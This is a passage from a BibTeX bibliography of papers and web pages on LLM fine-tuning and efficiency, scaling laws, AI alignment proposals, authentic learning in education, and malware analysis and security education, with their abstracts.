7B to 70B parameters at various quantization bits. For instance, {EfficientQAT} obtains a 2-bit Llama-2-70B model on a single A100-80GB {GPU} in 41 hours, with less than 3 points accuracy degradation compared to the full precision (69.48 vs. 72.41). Code is available at https://github.com/{OpenGVLab}/{EfficientQAT}.},
	number = {{arXiv}:2407.11062},
	publisher = {{arXiv}},
	author = {Chen, Mengzhao and Shao, Wenqi and Xu, Peng and Wang, Jiahao and Gao, Peng and Zhang, Kaipeng and Luo, Ping},
	urldate = {2025-08-30},
	date = {2025-05-19},
	eprinttype = {arxiv},
	eprint = {2407.11062 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{poth_adapters_2023,
	title = {Adapters: A Unified Library for Parameter-Efficient and Modular Transfer Learning},
	url = {http://arxiv.org/abs/2311.11077},
	doi = {10.48550/arXiv.2311.11077},
	shorttitle = {Adapters},
	abstract = {We introduce Adapters, an open-source library that unifies parameter-efficient and modular transfer learning in large language models. By integrating 10 diverse adapter methods into a unified interface, Adapters offers ease of use and flexible configuration. Our library allows researchers and practitioners to leverage adapter modularity through composition blocks, enabling the design of complex adapter setups. We demonstrate the library's efficacy by evaluating its performance against full fine-tuning on various {NLP} tasks. Adapters provides a powerful tool for addressing the challenges of conventional fine-tuning paradigms and promoting more efficient and modular transfer learning. The library is available via https://adapterhub.ml/adapters.},
	number = {{arXiv}:2311.11077},
	publisher = {{arXiv}},
	author = {Poth, Clifton and Sterz, Hannah and Paul, Indraneil and Purkayastha, Sukannya and Engländer, Leon and Imhof, Timo and Vulić, Ivan and Ruder, Sebastian and Gurevych, Iryna and Pfeiffer, Jonas},
	urldate = {2025-08-30},
	date = {2023-11-18},
	eprinttype = {arxiv},
	eprint = {2311.11077 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{hu_lora_2021,
	title = {{LoRA}: Low-Rank Adaptation of Large Language Models},
	url = {http://arxiv.org/abs/2106.09685},
	doi = {10.48550/arXiv.2106.09685},
	shorttitle = {{LoRA}},
	abstract = {An important paradigm of natural language processing consists of large-scale pre-training on general domain data and adaptation to particular tasks or domains. As we pre-train larger models, full fine-tuning, which retrains all model parameters, becomes less feasible. Using {GPT}-3 175B as an example -- deploying independent instances of fine-tuned models, each with 175B parameters, is prohibitively expensive. We propose Low-Rank Adaptation, or {LoRA}, which freezes the pre-trained model weights and injects trainable rank decomposition matrices into each layer of the Transformer architecture, greatly reducing the number of trainable parameters for downstream tasks. Compared to {GPT}-3 175B fine-tuned with Adam, {LoRA} can reduce the number of trainable parameters by 10,000 times and the {GPU} memory requirement by 3 times. {LoRA} performs on-par or better than fine-tuning in model quality on {RoBERTa}, {DeBERTa}, {GPT}-2, and {GPT}-3, despite having fewer trainable parameters, a higher training throughput, and, unlike adapters, no additional inference latency. We also provide an empirical investigation into rank-deficiency in language model adaptation, which sheds light on the efficacy of {LoRA}. We release a package that facilitates the integration of {LoRA} with {PyTorch} models and provide our implementations and model checkpoints for {RoBERTa}, {DeBERTa}, and {GPT}-2 at https://github.com/microsoft/{LoRA}.},
	number = {{arXiv}:2106.09685},
	publisher = {{arXiv}},
	author = {Hu, Edward J. and Shen, Yelong and Wallis, Phillip and Allen-Zhu, Zeyuan and Li, Yuanzhi and Wang, Shean and Wang, Lu and Chen, Weizhu},
	urldate = {2025-08-30},
	date = {2021-10-16},
	eprinttype = {arxiv},
	eprint = {2106.09685 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{zhao_lora_2024,
	title = {{LoRA} Land: 310 Fine-tuned {LLMs} that Rival {GPT}-4, A Technical Report},
	url = {http://arxiv.org/abs/2405.00732},
	doi = {10.48550/arXiv.2405.00732},
	shorttitle = {{LoRA} Land},
	abstract = {Low Rank Adaptation ({LoRA}) has emerged as one of the most widely adopted methods for Parameter Efficient Fine-Tuning ({PEFT}) of Large Language Models ({LLMs}). {LoRA} reduces the number of trainable parameters and memory usage while achieving comparable performance to full fine-tuning. We aim to assess the viability of training and serving {LLMs} fine-tuned with {LoRA} in real-world applications. First, we measure the quality of {LLMs} fine-tuned with quantized low rank adapters across 10 base models and 31 tasks for a total of 310 models. We find that 4-bit {LoRA} fine-tuned models outperform base models by 34 points and {GPT}-4 by 10 points on average. Second, we investigate the most effective base models for fine-tuning and assess the correlative and predictive capacities of task complexity heuristics in forecasting the outcomes of fine-tuning. Finally, we evaluate the latency and concurrency capabilities of {LoRAX}, an open-source Multi-{LoRA} inference server that facilitates the deployment of multiple {LoRA} fine-tuned models on a single {GPU} using shared base model weights and dynamic adapter loading. {LoRAX} powers {LoRA} Land, a web application that hosts 25 {LoRA} fine-tuned Mistral-7B {LLMs} on a single {NVIDIA} A100 {GPU} with 80GB memory. {LoRA} Land highlights the quality and cost-effectiveness of employing multiple specialized {LLMs} over a single, general-purpose {LLM}.},
	number = {{arXiv}:2405.00732},
	publisher = {{arXiv}},
	author = {Zhao, Justin and Wang, Timothy and Abid, Wael and Angus, Geoffrey and Garg, Arnav and Kinnison, Jeffery and Sherstinsky, Alex and Molino, Piero and Addair, Travis and Rishi, Devvret},
	urldate = {2025-08-30},
	date = {2024-04-29},
	eprinttype = {arxiv},
	eprint = {2405.00732 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{bengio_international_2025,
	title = {International {AI} Safety Report},
	url = {http://arxiv.org/abs/2501.17805},
	doi = {10.48550/arXiv.2501.17805},
	abstract = {The first International {AI} Safety Report comprehensively synthesizes the current evidence on the capabilities, risks, and safety of advanced {AI} systems. The report was mandated by the nations attending the {AI} Safety Summit in Bletchley, {UK}. Thirty nations, the {UN}, the {OECD}, and the {EU} each nominated a representative to the report's Expert Advisory Panel. A total of 100 {AI} experts contributed, representing diverse perspectives and disciplines. Led by the report's Chair, these independent experts collectively had full discretion over the report's content.},
	number = {{arXiv}:2501.17805},
	publisher = {{arXiv}},
	author = {Bengio, Yoshua and Mindermann, Sören and Privitera, Daniel and Besiroglu, Tamay and Bommasani, Rishi and Casper, Stephen and Choi, Yejin and Fox, Philip and Garfinkel, Ben and Goldfarb, Danielle and Heidari, Hoda and Ho, Anson and Kapoor, Sayash and Khalatbari, Leila and Longpre, Shayne and Manning, Sam and Mavroudis, Vasilios and Mazeika, Mantas and Michael, Julian and Newman, Jessica and Ng, Kwan Yee and Okolo, Chinasa T. and Raji, Deborah and Sastry, Girish and Seger, Elizabeth and Skeadas, Theodora and South, Tobin and Strubell, Emma and Tramèr, Florian and Velasco, Lucia and Wheeler, Nicole and Acemoglu, Daron and Adekanmbi, Olubayo and Dalrymple, David and Dietterich, Thomas G. and Felten, Edward W. and Fung, Pascale and Gourinchas, Pierre-Olivier and Heintz, Fredrik and Hinton, Geoffrey and Jennings, Nick and Krause, Andreas and Leavy, Susan and Liang, Percy and Ludermir, Teresa and Marda, Vidushi and Margetts, Helen and {McDermid}, John and Munga, Jane and Narayanan, Arvind and Nelson, Alondra and Neppel, Clara and Oh, Alice and Ramchurn, Gopal and Russell, Stuart and Schaake, Marietje and Schölkopf, Bernhard and Song, Dawn and Soto, Alvaro and Tiedrich, Lee and Varoquaux, Gaël and Yao, Andrew and Zhang, Ya-Qin and Albalawi, Fahad and Alserkal, Marwan and Ajala, Olubunmi and Avrin, Guillaume and Busch, Christian and Carvalho, André Carlos Ponce de Leon Ferreira de and Fox, Bronwyn and Gill, Amandeep Singh and Hatip, Ahmet Halit and Heikkilä, Juha and Jolly, Gill and Katzir, Ziv and Kitano, Hiroaki and Krüger, Antonio and Johnson, Chris and Khan, Saif M. and Lee, Kyoung Mu and Ligot, Dominic Vincent and Molchanovskyi, Oleksii and Monti, Andrea and Mwamanzi, Nusu and Nemer, Mona and Oliver, Nuria and Portillo, José Ramón López and Ravindran, Balaraman and Rivera, Raquel Pezoa and Riza, Hammam and Rugege, Crystal and Seoighe, Ciarán and Sheehan, Jerry and Sheikh, Haroon and Wong, Denise and Zeng, Yi},
	urldate = {2025-08-30},
	date = {2025-01-29},
	eprinttype = {arxiv},
	eprint = {2501.17805 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computers and Society, Computer Science - Machine Learning},
}

@misc{yang_qwen3_2025,
	title = {Qwen3 Technical Report},
	url = {http://arxiv.org/abs/2505.09388},
	doi = {10.48550/arXiv.2505.09388},
	abstract = {In this work, we present Qwen3, the latest version of the Qwen model family. Qwen3 comprises a series of large language models ({LLMs}) designed to advance performance, efficiency, and multilingual capabilities. The Qwen3 series includes models of both dense and Mixture-of-Expert ({MoE}) architectures, with parameter scales ranging from 0.6 to 235 billion. A key innovation in Qwen3 is the integration of thinking mode (for complex, multi-step reasoning) and non-thinking mode (for rapid, context-driven responses) into a unified framework. This eliminates the need to switch between different models--such as chat-optimized models (e.g., {GPT}-4o) and dedicated reasoning models (e.g., {QwQ}-32B)--and enables dynamic mode switching based on user queries or chat templates. Meanwhile, Qwen3 introduces a thinking budget mechanism, allowing users to allocate computational resources adaptively during inference, thereby balancing latency and performance based on task complexity. Moreover, by leveraging the knowledge from the flagship models, we significantly reduce the computational resources required to build smaller-scale models, while ensuring their highly competitive performance. Empirical evaluations demonstrate that Qwen3 achieves state-of-the-art results across diverse benchmarks, including tasks in code generation, mathematical reasoning, agent tasks, etc., competitive against larger {MoE} models and proprietary models. Compared to its predecessor Qwen2.5, Qwen3 expands multilingual support from 29 to 119 languages and dialects, enhancing global accessibility through improved cross-lingual understanding and generation capabilities. To facilitate reproducibility and community-driven research and development, all Qwen3 models are publicly accessible under Apache 2.0.},
	number = {{arXiv}:2505.09388},
	publisher = {{arXiv}},
	author = {Yang, An and Li, Anfeng and Yang, Baosong and Zhang, Beichen and Hui, Binyuan and Zheng, Bo and Yu, Bowen and Gao, Chang and Huang, Chengen and Lv, Chenxu and Zheng, Chujie and Liu, Dayiheng and Zhou, Fan and Huang, Fei and Hu, Feng and Ge, Hao and Wei, Haoran and Lin, Huan and Tang, Jialong and Yang, Jian and Tu, Jianhong and Zhang, Jianwei and Yang, Jianxin and Yang, Jiaxi and Zhou, Jing and Zhou, Jingren and Lin, Junyang and Dang, Kai and Bao, Keqin and Yang, Kexin and Yu, Le and Deng, Lianghao and Li, Mei and Xue, Mingfeng and Li, Mingze and Zhang, Pei and Wang, Peng and Zhu, Qin and Men, Rui and Gao, Ruize and Liu, Shixuan and Luo, Shuang and Li, Tianhao and Tang, Tianyi and Yin, Wenbiao and Ren, Xingzhang and Wang, Xinyu and Zhang, Xinyu and Ren, Xuancheng and Fan, Yang and Su, Yang and Zhang, Yichang and Zhang, Yinger and Wan, Yu and Liu, Yuqiong and Wang, Zekun and Cui, Zeyu and Zhang, Zhenru and Zhou, Zhipeng and Qiu, Zihan},
	urldate = {2025-08-29},
	date = {2025-05-14},
	eprinttype = {arxiv},
	eprint = {2505.09388 [cs]},
	keywords = {Computer Science - Computation and Language},
}

@misc{meng_transmla_2025,
	title = {{TransMLA}: Multi-Head Latent Attention Is All You Need},
	url = {http://arxiv.org/abs/2502.07864},
	doi = {10.48550/arXiv.2502.07864},
	shorttitle = {{TransMLA}},
	abstract = {In this paper, we present {TransMLA}, a framework that seamlessly converts any {GQA}-based pre-trained model into an {MLA}-based model. Our approach enables direct compatibility with {DeepSeek}'s codebase, allowing these models to fully leverage {DeepSeek}-specific optimizations such as {vLLM} and {SGlang}. By compressing 93\% of the {KV} cache in {LLaMA}-2-7B, {TransMLA} achieves a 10.6x inference speedup at an 8K context length while preserving meaningful output quality. Additionally, the model requires only 6 billion tokens for fine-tuning to regain performance on par with the original across multiple benchmarks. {TransMLA} offers a practical solution for migrating {GQA}-based models to the {MLA} structure. When combined with {DeepSeek}'s advanced features, such as {FP}8 quantization and Multi-Token Prediction, even greater inference acceleration can be realized.},
	number = {{arXiv}:2502.07864},
	publisher = {{arXiv}},
	author = {Meng, Fanxu and Tang, Pingzhi and Tang, Xiaojuan and Yao, Zengwei and Sun, Xing and Zhang, Muhan},
	urldate = {2025-08-29},
	date = {2025-06-12},
	eprinttype = {arxiv},
	eprint = {2502.07864 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Machine Learning},
}

@misc{dao_flashattention_2022,
	title = {{FlashAttention}: Fast and Memory-Efficient Exact Attention with {IO}-Awareness},
	url = {http://arxiv.org/abs/2205.14135},
	doi = {10.48550/arXiv.2205.14135},
	shorttitle = {{FlashAttention}},
	abstract = {Transformers are slow and memory-hungry on long sequences, since the time and memory complexity of self-attention are quadratic in sequence length. Approximate attention methods have attempted to address this problem by trading off model quality to reduce the compute complexity, but often do not achieve wall-clock speedup. We argue that a missing principle is making attention algorithms {IO}-aware -- accounting for reads and writes between levels of {GPU} memory. We propose {FlashAttention}, an {IO}-aware exact attention algorithm that uses tiling to reduce the number of memory reads/writes between {GPU} high bandwidth memory ({HBM}) and {GPU} on-chip {SRAM}. We analyze the {IO} complexity of {FlashAttention}, showing that it requires fewer {HBM} accesses than standard attention, and is optimal for a range of {SRAM} sizes. We also extend {FlashAttention} to block-sparse attention, yielding an approximate attention algorithm that is faster than any existing approximate attention method. {FlashAttention} trains Transformers faster than existing baselines: 15\% end-to-end wall-clock speedup on {BERT}-large (seq. length 512) compared to the {MLPerf} 1.1 training speed record, 3\${\textbackslash}times\$ speedup on {GPT}-2 (seq. length 1K), and 2.4\${\textbackslash}times\$ speedup on long-range arena (seq. length 1K-4K). {FlashAttention} and block-sparse {FlashAttention} enable longer context in Transformers, yielding higher quality models (0.7 better perplexity on {GPT}-2 and 6.4 points of lift on long-document classification) and entirely new capabilities: the first Transformers to achieve better-than-chance performance on the Path-X challenge (seq. length 16K, 61.4\% accuracy) and Path-256 (seq. length 64K, 63.1\% accuracy).},
	number = {{arXiv}:2205.14135},
	publisher = {{arXiv}},
	author = {Dao, Tri and Fu, Daniel Y. and Ermon, Stefano and Rudra, Atri and Ré, Christopher},
	urldate = {2025-08-22},
	date = {2022-06-23},
	eprinttype = {arxiv},
	eprint = {2205.14135 [cs]},
	keywords = {Computer Science - Machine Learning},
}

@online{noauthor_were_nodate,
	title = {We’re Training {AI} Twice as Fast This Year as Last - {IEEE} Spectrum},
	url = {https://spectrum.ieee.org/mlperf-rankings-2022},
	abstract = {New {MLPerf} rankings show training times plunging},
	urldate = {2025-08-22},
	langid = {english},
}

@online{noauthor_mimicking_2025,
	title = {Mimicking Consciousness in {LLMs}: Ascending the Dimensions of Thought with Recurrent Processing},
	url = {https://huggingface.co/blog/KnutJaegersberg/oscillatory-recurrence-for-llms},
	shorttitle = {Mimicking Consciousness in {LLMs}},
	abstract = {A Blog post by Knut Jägersberg on Hugging Face},
	urldate = {2025-08-12},
	date = {2025-02-20},
}

@article{lombardi_authentic_2007,
	title = {Authentic Learning for the 21st Century: An Overview},
	abstract = {Learning-by-doing is generally considered the most effective way to learn. The Internet and a variety of emerging communication, visualization, and simulation technologies now make it possible to offer students authentic learning experiences ranging from experimentation to real-world problem solving. This white paper explores what constitutes authentic learning, how technology supports it, what makes it effective, and why it is important.},
	author = {Lombardi, Marilyn M},
	date = {2007-05},
	langid = {english},
}

@article{roach_how_2018,
	title = {How authentic does authentic learning have to be?},
	volume = {3},
	issn = {null},
	url = {https://doi.org/10.1080/23752696.2018.1462099},
	doi = {10.1080/23752696.2018.1462099},
	abstract = {This study presents an analysis of self-reported student perceptions and experiences of authenticity during an undergraduate first-year problem-based learning ({PBL}) engineering module at {UCL}. The aim is to further understand how students perceive authentic learning experiences in order to support and maximise this kind of learning throughout their degree programmes. The data shows that our students did perceive their first-year experiences as authentic despite the fact that the context they worked in and the outputs that they created were not the most real-world part of their experience. The data supports previous work on authentic learning which suggests what really matters is cognitive realism and not physical realism. However, it may be possible to introduce levels of authenticity at increasing levels of complexity throughout the student journey. The analysis is located within the wider field of authentic learning, {PBL} and builds on this work to suggest how dimensions of authenticity may be graduated across a degree programme.},
	pages = {495--509},
	number = {1},
	journaltitle = {Higher Education Pedagogies},
	author = {Roach, Kate and Tilley, Emanuela and Mitchell, John},
	urldate = {2025-08-10},
	date = {2018-01-01},
	note = {Publisher: Routledge
\_eprint: https://doi.org/10.1080/23752696.2018.1462099},
	keywords = {Authentic learning, cognitive realism, engineering education, problem-based learning},
}

@online{noauthor_estimating_2025,
	title = {Estimating worst case frontier risks of open weight {LLMs}},
	url = {https://openai.com/index/estimating-worst-case-frontier-risks-of-open-weight-llms/},
	abstract = {In this paper, we study the worst-case frontier risks of releasing gpt-oss. We introduce malicious fine-tuning ({MFT}), where we attempt to elicit maximum capabilities by fine-tuning gpt-oss to be as capable as possible in two domains: biology and cybersecurity.},
	urldate = {2025-08-06},
	date = {2025-08-05},
	langid = {american},
}

@inproceedings{yeen-ju_authentic_2013,
	title = {Authentic Learning Strategies to Engage Student's Creative and Critical Thinking},
	url = {https://ieeexplore.ieee.org/document/6702783},
	doi = {10.1109/ICICM.2013.19},
	abstract = {Recent research reveals that graduates lack problem-solving skills and communication skills that are an integral part of industry demands. There is now a growing necessity to move towards an education system that can prepare graduates with important skills to enter the working world. In response to this, universities are now moving towards more authentic learning strategies that are student-centred and are able to provide students with the crucial skills they need. This paper presents a study that sought to investigate how efficient an authentic learning environment, with a project-based curriculum that is supported by multimedia and web technologies, can engage students' creative and critical thinking. Results showed that authentic learning strategies encouraged higher order thinking skills, made learning active, supported the development of important career skills and enhanced understanding. The positive results strongly encourage the use of authentic learning strategies to engage students' creative and critical thinking.},
	eventtitle = {2013 International Conference on Informatics and Creative Multimedia},
	pages = {57--62},
	booktitle = {2013 International Conference on Informatics and Creative Multimedia},
	author = {Yeen-Ju, Heidi Tan and Mai, Neo and Kian, Neo Tse and Jing, Kwok Wai and Wen, Lee Kai and Haw, Lai Chen},
	urldate = {2025-07-31},
	date = {2013-09},
	keywords = {Authentic learning, Blogs, Education, Facebook, Multimedia communication, Problem-solving, Teamwork, creative thinking, critical thinking, multimedia, web technologies},
}

@misc{kaplan_scaling_2020,
	title = {Scaling Laws for Neural Language Models},
	url = {http://arxiv.org/abs/2001.08361},
	doi = {10.48550/arXiv.2001.08361},
	abstract = {We study empirical scaling laws for language model performance on the cross-entropy loss. The loss scales as a power-law with model size, dataset size, and the amount of compute used for training, with some trends spanning more than seven orders of magnitude. Other architectural details such as network width or depth have minimal effects within a wide range. Simple equations govern the dependence of overfitting on model/dataset size and the dependence of training speed on model size. These relationships allow us to determine the optimal allocation of a fixed compute budget. Larger models are significantly more sample-efficient, such that optimally compute-efficient training involves training very large models on a relatively modest amount of data and stopping significantly before convergence.},
	number = {{arXiv}:2001.08361},
	publisher = {{arXiv}},
	author = {Kaplan, Jared and {McCandlish}, Sam and Henighan, Tom and Brown, Tom B. and Chess, Benjamin and Child, Rewon and Gray, Scott and Radford, Alec and Wu, Jeffrey and Amodei, Dario},
	urldate = {2025-07-27},
	date = {2020-01-23},
	eprinttype = {arxiv},
	eprint = {2001.08361 [cs]},
	keywords = {Computer Science - Machine Learning, Statistics - Machine Learning},
}

@misc{christiano_supervising_2018,
	title = {Supervising strong learners by amplifying weak experts},
	url = {http://arxiv.org/abs/1810.08575},
	doi = {10.48550/arXiv.1810.08575},
	abstract = {Many real world learning tasks involve complex or hard-to-specify objectives, and using an easier-to-specify proxy can lead to poor performance or misaligned behavior. One solution is to have humans provide a training signal by demonstrating or judging performance, but this approach fails if the task is too complicated for a human to directly evaluate. We propose Iterated Amplification, an alternative training strategy which progressively builds up a training signal for difficult problems by combining solutions to easier subproblems. Iterated Amplification is closely related to Expert Iteration (Anthony et al., 2017; Silver et al., 2017), except that it uses no external reward function. We present results in algorithmic environments, showing that Iterated Amplification can efficiently learn complex behaviors.},
	number = {{arXiv}:1810.08575},
	publisher = {{arXiv}},
	author = {Christiano, Paul and Shlegeris, Buck and Amodei, Dario},
	urldate = {2025-07-27},
	date = {2018-10-19},
	eprinttype = {arxiv},
	eprint = {1810.08575 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Machine Learning, Statistics - Machine Learning},
}

@misc{ziegler_fine-tuning_2020,
	title = {Fine-Tuning Language Models from Human Preferences},
	url = {http://arxiv.org/abs/1909.08593},
	doi = {10.48550/arXiv.1909.08593},
	abstract = {Reward learning enables the application of reinforcement learning ({RL}) to tasks where reward is defined by human judgment, building a model of reward by asking humans questions. Most work on reward learning has used simulated environments, but complex information about values is often expressed in natural language, and we believe reward learning for language is a key to making {RL} practical and safe for real-world tasks. In this paper, we build on advances in generative pretraining of language models to apply reward learning to four natural language tasks: continuing text with positive sentiment or physically descriptive language, and summarization tasks on the {TL};{DR} and {CNN}/Daily Mail datasets. For stylistic continuation we achieve good results with only 5,000 comparisons evaluated by humans. For summarization, models trained with 60,000 comparisons copy whole sentences from the input but skip irrelevant preamble; this leads to reasonable {ROUGE} scores and very good performance according to our human labelers, but may be exploiting the fact that labelers rely on simple heuristics.},
	number = {{arXiv}:1909.08593},
	publisher = {{arXiv}},
	author = {Ziegler, Daniel M. and Stiennon, Nisan and Wu, Jeffrey and Brown, Tom B. and Radford, Alec and Amodei, Dario and Christiano, Paul and Irving, Geoffrey},
	urldate = {2025-07-27},
	date = {2020-01-08},
	eprinttype = {arxiv},
	eprint = {1909.08593 [cs]},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning, Statistics - Machine Learning},
}

@misc{leike_scalable_2018,
	title = {Scalable agent alignment via reward modeling: a research direction},
	url = {http://arxiv.org/abs/1811.07871},
	doi = {10.48550/arXiv.1811.07871},
	shorttitle = {Scalable agent alignment via reward modeling},
	abstract = {One obstacle to applying reinforcement learning algorithms to real-world problems is the lack of suitable reward functions. Designing such reward functions is difficult in part because the user only has an implicit understanding of the task objective. This gives rise to the agent alignment problem: how do we create agents that behave in accordance with the user's intentions? We outline a high-level research direction to solve the agent alignment problem centered around reward modeling: learning a reward function from interaction with the user and optimizing the learned reward function with reinforcement learning. We discuss the key challenges we expect to face when scaling reward modeling to complex and general domains, concrete approaches to mitigate these challenges, and ways to establish trust in the resulting agents.},
	number = {{arXiv}:1811.07871},
	publisher = {{arXiv}},
	author = {Leike, Jan and Krueger, David and Everitt, Tom and Martic, Miljan and Maini, Vishal and Legg, Shane},
	urldate = {2025-07-27},
	date = {2018-11-19},
	eprinttype = {arxiv},
	eprint = {1811.07871 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Machine Learning, Computer Science - Neural and Evolutionary Computing, Statistics - Machine Learning},
}

@misc{irving_ai_2018,
	title = {{AI} safety via debate},
	url = {http://arxiv.org/abs/1805.00899},
	doi = {10.48550/arXiv.1805.00899},
	abstract = {To make {AI} systems broadly useful for challenging real-world tasks, we need them to learn complex human goals and preferences. One approach to specifying complex goals asks humans to judge during training which agent behaviors are safe and useful, but this approach can fail if the task is too complicated for a human to directly judge. To help address this concern, we propose training agents via self play on a zero sum debate game. Given a question or proposed action, two agents take turns making short statements up to a limit, then a human judges which of the agents gave the most true, useful information. In an analogy to complexity theory, debate with optimal play can answer any question in {PSPACE} given polynomial time judges (direct judging answers only {NP} questions). In practice, whether debate works involves empirical questions about humans and the tasks we want {AIs} to perform, plus theoretical questions about the meaning of {AI} alignment. We report results on an initial {MNIST} experiment where agents compete to convince a sparse classifier, boosting the classifier's accuracy from 59.4\% to 88.9\% given 6 pixels and from 48.2\% to 85.2\% given 4 pixels. Finally, we discuss theoretical and practical aspects of the debate model, focusing on potential weaknesses as the model scales up, and we propose future human and computer experiments to test these properties.},
	number = {{arXiv}:1805.00899},
	publisher = {{arXiv}},
	author = {Irving, Geoffrey and Christiano, Paul and Amodei, Dario},
	urldate = {2025-07-27},
	date = {2018-10-22},
	eprinttype = {arxiv},
	eprint = {1805.00899 [stat]},
	keywords = {Computer Science - Machine Learning, Statistics - Machine Learning},
}

@misc{xu_hallucination_2025,
	title = {Hallucination is Inevitable: An Innate Limitation of Large Language Models},
	url = {http://arxiv.org/abs/2401.11817},
	doi = {10.48550/arXiv.2401.11817},
	shorttitle = {Hallucination is Inevitable},
	abstract = {Hallucination has been widely recognized to be a significant drawback for large language models ({LLMs}). There have been many works that attempt to reduce the extent of hallucination. These efforts have mostly been empirical so far, which cannot answer the fundamental question whether it can be completely eliminated. In this paper, we formalize the problem and show that it is impossible to eliminate hallucination in {LLMs}. Specifically, we define a formal world where hallucination is defined as inconsistencies between a computable {LLM} and a computable ground truth function. By employing results from learning theory, we show that {LLMs} cannot learn all the computable functions and will therefore inevitably hallucinate if used as general problem solvers. Since the formal world is a part of the real world which is much more complicated, hallucinations are also inevitable for real world {LLMs}. Furthermore, for real world {LLMs} constrained by provable time complexity, we describe the hallucination-prone tasks and empirically validate our claims. Finally, using the formal world framework, we discuss the possible mechanisms and efficacies of existing hallucination mitigators as well as the practical implications on the safe deployment of {LLMs}.},
	number = {{arXiv}:2401.11817},
	publisher = {{arXiv}},
	author = {Xu, Ziwei and Jain, Sanjay and Kankanhalli, Mohan},
	urldate = {2025-07-22},
	date = {2025-02-13},
	eprinttype = {arxiv},
	eprint = {2401.11817 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{geiping_scaling_2025,
	title = {Scaling up Test-Time Compute with Latent Reasoning: A Recurrent Depth Approach},
	url = {http://arxiv.org/abs/2502.05171},
	doi = {10.48550/arXiv.2502.05171},
	shorttitle = {Scaling up Test-Time Compute with Latent Reasoning},
	abstract = {We study a novel language model architecture that is capable of scaling test-time computation by implicitly reasoning in latent space. Our model works by iterating a recurrent block, thereby unrolling to arbitrary depth at test-time. This stands in contrast to mainstream reasoning models that scale up compute by producing more tokens. Unlike approaches based on chain-of-thought, our approach does not require any specialized training data, can work with small context windows, and can capture types of reasoning that are not easily represented in words. We scale a proof-of-concept model to 3.5 billion parameters and 800 billion tokens. We show that the resulting model can improve its performance on reasoning benchmarks, sometimes dramatically, up to a computation load equivalent to 50 billion parameters.},
	number = {{arXiv}:2502.05171},
	publisher = {{arXiv}},
	author = {Geiping, Jonas and {McLeish}, Sean and Jain, Neel and Kirchenbauer, John and Singh, Siddharth and Bartoldson, Brian R. and Kailkhura, Bhavya and Bhatele, Abhinav and Goldstein, Tom},
	urldate = {2025-07-17},
	date = {2025-02-17},
	eprinttype = {arxiv},
	eprint = {2502.05171 [cs]},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@inproceedings{chen_are_2024,
	title = {Are More {LLM} Calls All You Need? Towards the Scaling Properties of Compound {AI} Systems},
	url = {https://openreview.net/forum?id=m5106RRLgx},
	shorttitle = {Are More {LLM} Calls All You Need?},
	abstract = {Many recent state-of-the-art results in language tasks were achieved using compound systems that perform multiple Language Model ({LM}) calls and aggregate their responses. However, there is little understanding of how the number of {LM} calls -- e.g., when asking the {LM} to answer each question multiple times and taking a majority vote -- affects such a compound system's performance. In this paper, we initiate the study of scaling properties of compound inference systems. We analyze, theoretically and empirically, how the number of {LM} calls affects the performance of Vote and Filter-Vote, two of the simplest compound system designs, which aggregate {LM} responses via majority voting, optionally applying {LM} filters. We find, surprisingly, that across multiple language tasks, the performance of both Vote and Filter-Vote can first increase but then decrease as a function of the number of {LM} calls. Our theoretical results suggest that this non-monotonicity is due to the diversity of query difficulties within a task: more {LM} calls lead to higher performance on "easy" queries, but lower performance on "hard" queries, and non-monotone behavior can emerge when a task contains both types of queries. This insight then allows us to compute, from a small number of samples, the number of {LM} calls that maximizes system performance, and define an analytical scaling model for both systems. Experiments show that our scaling model can accurately predict the performance of Vote and Filter-Vote systems and thus find the optimal number of {LM} calls to make.},
	eventtitle = {The Thirty-eighth Annual Conference on Neural Information Processing Systems},
	author = {Chen, Lingjiao and Davis, Jared Quincy and Hanin, Boris and Bailis, Peter and Stoica, Ion and Zaharia, Matei and Zou, James},
	urldate = {2025-07-17},
	date = {2024-11-06},
	langid = {english},
}

@article{duncan_security_2019,
	title = {Security implications of running windows software on a Linux system using Wine: a malware analysis study},
	volume = {15},
	issn = {2263-8733},
	url = {https://doi.org/10.1007/s11416-018-0319-9},
	doi = {10.1007/s11416-018-0319-9},
	shorttitle = {Security implications of running windows software on a Linux system using Wine},
	abstract = {Linux is considered to be less prone to malware compared to other operating systems, and as a result Linux users rarely run anti-malware. However, many popular software applications released on other platforms cannot run natively on Linux. Wine is a popular compatibility layer for running Windows programs on Linux. The level of security risk that Wine poses to Linux users is largely undocumented. This project was conducted to assess the security implications of using Wine, and to determine if any specific types of malware or malware behavior have a significant effect on the malware being successful in Wine. Dynamic analysis (both automated and manual) was applied to 30 malware samples both in a Windows environment and Linux environment running Wine. Behavior analyzed included file system, registry, and network access, and the spawning of processes, and services. The behavior was compared to determine malware success in Wine. The study results provide evidence that Wine can pose serious security implications when used to run Windows software in a Linux environment. Five samples of Windows malware were run successfully through Wine on a Linux system. No significant relationships were discovered between the success of the malware and its high-level behavior or malware type. However, certain {API} calls could not be recreated in a Linux environment, and led to failure of malware to execute via Wine. This suggests that particular malware samples that utilize these {API} calls will never run completely successfully in a Linux environment. As a consequence, the success of some samples can be determined from observing the {API} calls when run within a Windows environment.},
	pages = {39--60},
	number = {1},
	journaltitle = {Journal of Computer Virology and Hacking Techniques},
	shortjournal = {J Comput Virol Hack Tech},
	author = {Duncan, Rory and Schreuders, Z. Cliffe},
	urldate = {2025-07-11},
	date = {2019-03-01},
	langid = {english},
	keywords = {Computer Crime, {IT} Security Awareness, Linux, Malware analysis, Malware compatibility, Open Source, Operating Systems, Viticulture, Wine},
}

@inproceedings{schreuders_generating_2015,
	location = {Liverpool},
	title = {Generating randomised virtualised scenarios for ethical hacking and computer security education: {SecGen} implementation and deployment},
